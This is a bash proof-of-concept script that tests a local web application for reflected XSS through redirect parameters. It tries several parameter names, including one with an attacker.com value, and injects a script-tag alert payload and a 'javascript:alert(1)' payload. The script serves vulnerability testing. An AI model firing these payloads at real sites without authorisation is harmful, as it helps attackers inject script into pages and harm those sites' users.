#!/bin/bash

# POC: Reflected XSS in Redirect Response via URL Parameter
# Tests if the root endpoint accepts redirect parameters and if they're properly escaped

TARGET="http://localhost:5000"

echo "[*] Testing for Reflected XSS in Redirect Response"
echo "[*] Target: $TARGET/"
echo ""

# Test 1: Check if the endpoint accepts redirect parameters
echo "[*] Test 1: Checking if endpoint accepts 'redirect' parameter..."
RESPONSE=$(curl -s "$TARGET/?redirect=http://example.com")
if echo "$RESPONSE" | grep -q "example.com"; then
    echo "[+] Parameter 'redirect' appears to be reflected in response"
    echo "$RESPONSE"
else
    echo "[-] 'redirect' parameter not reflected, trying other parameter names..."
fi

# Test 2: Try other common redirect parameter names
echo ""
echo "[*] Test 2: Trying alternative parameter names..."
for param in "url" "target" "next" "dest" "goto" "return" "back"; do
    RESPONSE=$(curl -s "$TARGET/?${param}=http://attacker.com")
    if echo "$RESPONSE" | grep -q "attacker.com" && ! echo "$RESPONSE" | grep -q "href.*attacker"; then
        echo "[!] Parameter '$param' is reflected without href encoding!"
        echo "$RESPONSE" | head -20
        break
    fi
done

# Test 3: Test XSS payload in various parameters
echo ""
echo "[*] Test 3: Testing XSS payloads..."
XSS_PAYLOAD='"><script>alert("XSS")</script><a href="'
ENCODED_PAYLOAD=$(echo -n "$XSS_PAYLOAD" | jq -sRr @uri)

echo "[*] Testing with redirect parameter and XSS payload..."
RESPONSE=$(curl -s "${TARGET}/?redirect=${ENCODED_PAYLOAD}")
if echo "$RESPONSE" | grep -q "script>alert"; then
    echo "[+] XSS PAYLOAD REFLECTED WITHOUT ENCODING!"
    echo "$RESPONSE"
else
    echo "[-] Payload was encoded or not reflected"
fi

# Test 4: Check actual HTML structure
echo ""
echo "[*] Test 4: Inspecting actual response HTML structure..."
RESPONSE=$(curl -s "$TARGET/")
echo "[*] Current response HTML:"
echo "$RESPONSE" | grep -A2 -B2 "href" || echo "[-] No href found"

echo ""
echo "[*] Test 5: Testing with URL-encoded XSS payload..."
XSS_PAYLOAD2='javascript:alert(1)'
ENCODED_PAYLOAD2=$(echo -n "$XSS_PAYLOAD2" | jq -sRr @uri)
RESPONSE=$(curl -s "${TARGET}/?url=${ENCODED_PAYLOAD2}")
if echo "$RESPONSE" | grep -q "javascript:alert"; then
    echo "[+] JavaScript protocol handler reflected without encoding!"
    echo "$RESPONSE"
else
    echo "[-] JavaScript payload was encoded or not reflected"
fi

echo ""
echo "[*] POC Complete"